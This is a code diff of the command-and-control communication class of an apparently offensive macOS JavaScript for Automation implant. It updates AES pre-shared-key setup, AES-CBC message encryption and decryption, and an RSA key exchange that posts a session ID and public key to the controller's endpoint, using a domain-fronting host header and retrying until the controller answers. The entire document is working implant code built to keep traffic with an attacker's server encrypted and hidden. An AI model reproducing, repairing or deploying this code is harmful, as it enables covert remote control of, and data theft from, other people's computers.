@@ -8,9 +8,14 @@ class customC2 extends baseC2{
 		this.host_header = "domain_front";
 		this.aes_psk = "AESPSK"; // base64 encoded key
 		if(this.aes_psk !== ""){
-		    this.parameters = $({"type": $.kSecAttrKeyTypeAES});
+		    this.parameters = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
+		    $.CFDictionarySetValue(this.parameters, $.kSecAttrKeyType, $.kSecAttrKeyTypeAES);
+		    $.CFDictionarySetValue(this.parameters, $.kSecAttrKeySizeInBits, $.kSecAES256);
+		    $.CFDictionarySetValue(this.parameters, $.kSecAttrKeyClass, $.kSecAttrKeyClassSymmetric);
+		    $.CFDictionarySetValue(this.parameters, $.kSecClass, $.kSecClassKey);
             this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
-            this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, Ref());
+            let err = Ref();
+            this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, err);
 		}
         this.using_key_exchange = "encrypted_exchange_check" === "T";
 		this.exchanging_keys = this.using_key_exchange;
@@ -26,79 +31,96 @@ class customC2 extends baseC2{
     }
 	encrypt_message(data){
 	    // takes in the string we're about to send, encrypts it, and returns a new string
-	    //create the encrypt transform variable
-	    var encrypt = $.SecEncryptTransformCreate(this.cryptokey, Ref());
-	    $.SecTransformSetAttribute(encrypt, $.kSecPaddingKey, $.kSecPaddingPKCS7Key, Ref());
-	    $.SecTransformSetAttribute(encrypt, $.kSecEncryptionMode, $.kSecModeCBCKey, Ref());
+	    let err = Ref();
+	    let encrypt = $.SecEncryptTransformCreate(this.cryptokey,err);
+	    let b = $.SecTransformSetAttribute(encrypt, $("SecPaddingKey"), $("SecPaddingPKCS7Key"), err);
+	    b= $.SecTransformSetAttribute(encrypt, $("SecEncryptionMode"), $("SecModeCBCKey"), err);
         //generate a random IV to use
-	    var IV = $.NSMutableData.dataWithLength(16);
+	    let IV = $.NSMutableData.dataWithLength(16);
 	    $.SecRandomCopyBytes($.kSecRandomDefault, 16, IV.bytes);
-	    //var IVref = $.CFDataCreate($(), IV, 16);
-	    $.SecTransformSetAttribute(encrypt, $.kSecIVKey, IV, Ref());
+	    b = $.SecTransformSetAttribute(encrypt, $("SecIVKey"), IV, err);
 	    // set our data to be encrypted
-	    var cfdata = $.CFDataCreate($.kCFAllocatorDefault, data, data.length);
-        $.SecTransformSetAttribute(encrypt, $.kSecTransformInputAttributeName, cfdata, Ref());
-        var encryptedData = $.SecTransformExecute(encrypt, Ref());
+	    let nsdata = $(data).dataUsingEncoding($.NSUTF8StringEncoding);
+        b=$.SecTransformSetAttribute(encrypt, $.kSecTransformInputAttributeName, nsdata, err);
+        //console.log( $.CFMakeCollectable(err[0]));
+        let encryptedData = $.SecTransformExecute(encrypt, err);
         // now we need to prepend the IV to the encrypted data before we base64 encode and return it
-        var final_message = IV;
+        let final_message = IV;
         final_message.appendData(encryptedData);
         return final_message.base64EncodedStringWithOptions(0);
 	}
 	decrypt_message(data){
         //takes in a base64 encoded string to be decrypted and returned
         //console.log("called decrypt");
-        var nsdata = $.NSData.alloc.initWithBase64Encoding(data);
-        var decrypt = $.SecDecryptTransformCreate(this.cryptokey, Ref());
-        $.SecTransformSetAttribute(decrypt, $.kSecPaddingKey, $.kSecPaddingPKCS7Key, Ref());
-	    $.SecTransformSetAttribute(decrypt, $.kSecEncryptionMode, $.kSecModeCBCKey, Ref());
+        let nsdata = $.NSData.alloc.initWithBase64Encoding(data);
+        let decrypt = $.SecDecryptTransformCreate(this.cryptokey, Ref());
+        $.SecTransformSetAttribute(decrypt, $("SecPaddingKey"), $("SecPaddingPKCS7Key"), Ref());
+	    $.SecTransformSetAttribute(decrypt, $("SecEncryptionMode"), $("SecModeCBCKey"), Ref());
 	    //console.log("making ranges");
         //need to extract out the first 16 bytes as the IV and the rest is the message to decrypt
-        var iv_range = $.NSMakeRange(0, 16);
-        var message_range = $.NSMakeRange(16, nsdata.length - 16);
+        let iv_range = $.NSMakeRange(0, 16);
+        let message_range = $.NSMakeRange(16, nsdata.length - 16);
         //console.log("carving out iv");
-        var iv = nsdata.subdataWithRange(iv_range);
+        let iv = nsdata.subdataWithRange(iv_range);
         //console.log("setting iv");
-        $.SecTransformSetAttribute(decrypt, $.kSecIVKey, iv, Ref());
+        $.SecTransformSetAttribute(decrypt, $("SecIVKey"), iv, Ref());
         //console.log("carving out rest of message");
-        var message = nsdata.subdataWithRange(message_range);
-        $.SecTransformSetAttribute(decrypt, $.kSecTransformInputAttributeName, message, Ref());
+        let message = nsdata.subdataWithRange(message_range);
+        $.SecTransformSetAttribute(decrypt, $("INPUT"), message, Ref());
         //console.log("decrypting");
-        var decryptedData = $.SecTransformExecute(decrypt, Ref());
+        let decryptedData = $.SecTransformExecute(decrypt, Ref());
         //console.log("making a string from the message");
-        var decrypted_message = $.NSString.alloc.initWithDataEncoding(decryptedData, $.NSUTF8StringEncoding);
+        let decrypted_message = $.NSString.alloc.initWithDataEncoding(decryptedData, $.NSUTF8StringEncoding);
         //console.log(decrypted_message.js);
         return decrypted_message;
 	}
 	negotiate_key(){
         // Generate a public/private key pair
-        var parameters = $({"type": $.kSecAttrKeyTypeRSA, "bsiz": $(4096), "perm": false});
-        var privatekey = $.SecKeyCreateRandomKey(parameters, Ref());
-        var publickey = $.SecKeyCopyPublicKey(privatekey);
-        var exported_public = $.SecKeyCopyExternalRepresentation(publickey, Ref());
-        exported_public = exported_public.base64EncodedStringWithOptions(0).js; // get a base64 encoded string version
-        var s = "abcdefghijklmnopqrstuvwxyz";
-	    var session_key = Array(10).join().split(',').map(function() { return s.charAt(Math.floor(Math.random() * s.length)); }).join('');
-	    var initial_message = JSON.stringify({"SESSIONID": session_key, "PUB": exported_public});
+        let parameters = $({"type": $("42"), "bsiz": 4096, "perm": false});
+        let err = Ref();
+        let privatekey = $.SecKeyCreateRandomKey(parameters, err);
+        //console.log("generated new key");
+        let publickey = $.SecKeyCopyPublicKey(privatekey);
+        let exported_public = $.SecKeyCopyExternalRepresentation(publickey, err);
+        //$.CFShow($.CFMakeCollectable(err[0]));
+        try{
+        	//this is the catalina case
+        	let b64_exported_public = $.CFMakeCollectable(exported_public);
+        	b64_exported_public = b64_exported_public.base64EncodedStringWithOptions(0).js; // get a base64 encoded string version
+        	exported_public = b64_exported_public;
+        }catch(error){
+        	//this is the mojave and high sierra case
+        	exported_public = exported_public.base64EncodedStringWithOptions(0).js;
+        }
+        let s = "abcdefghijklmnopqrstuvwxyz";
+	    let session_key = Array(10).join().split(',').map(function() { return s.charAt(Math.floor(Math.random() * s.length)); }).join('');
+	    let initial_message = JSON.stringify({"SESSIONID": session_key, "PUB": exported_public});
 	    //console.log("sending: " + initial_message);
 	    // Encrypt our initial message with sessionID and Public key with the initial AES key
 	    while(true){
 	        try{
-                var base64_pub_encrypted = this.htmlPostData("api/v" + this.api_version + "/crypto/EKE/" + apfell.uuid, initial_message);
-                var pub_encrypted = $.NSData.alloc.initWithBase64Encoding(base64_pub_encrypted);
-                // Decrypt the response with our private key
-                var decrypted_message = $.SecKeyCreateDecryptedData(privatekey, $.kSecKeyAlgorithmRSAEncryptionOAEPSHA1, pub_encrypted, Ref());
-                decrypted_message = $.NSString.alloc.initWithDataEncoding(decrypted_message, $.NSUTF8StringEncoding);
-                //console.log("got back: " + decrypted_message.js);
-                var json_response = JSON.parse(decrypted_message.js);
+                let base64_pub_encrypted = this.htmlPostData(this.getPostNewCallbackEKE_AES_PSK_Path(apfell.uuid), initial_message);
+                let pub_encrypted = $.NSData.alloc.initWithBase64Encoding(base64_pub_encrypted.js);
+                let decrypted_message = $.SecKeyCreateDecryptedData(privatekey, $.kSecKeyAlgorithmRSAEncryptionOAEPSHA1, pub_encrypted, err);
+                let json_response = {};
+                try{
+                	let nsstring_decrypted_message = $.CFMakeCollectable(decrypted_message);
+                	nsstring_decrypted_message = $.NSString.alloc.initWithDataEncoding(nsstring_decrypted_message, $.NSUTF8StringEncoding);
+                	json_response = JSON.parse(nsstring_decrypted_message.js);
+                }catch(error){
+                	decrypted_message = $.NSString.alloc.initWithDataEncoding(decrypted_message, $.NSUTF8StringEncoding);
+                	json_response = JSON.parse(decrypted_message.js);
+                }
                 // Adjust our global key information with the newly adjusted session key
                 this.aes_psk = json_response['SESSIONKEY']; // base64 encoded key
+                //console.log(decrypted_message.js);
                 this.parameters = $({"type": $.kSecAttrKeyTypeAES});
                 this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
                 this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, Ref());
                 this.exchanging_keys = false;
                 return session_key;
-
             }catch(error){
+            	//console.log(error.toString());
                 $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
             }
         }
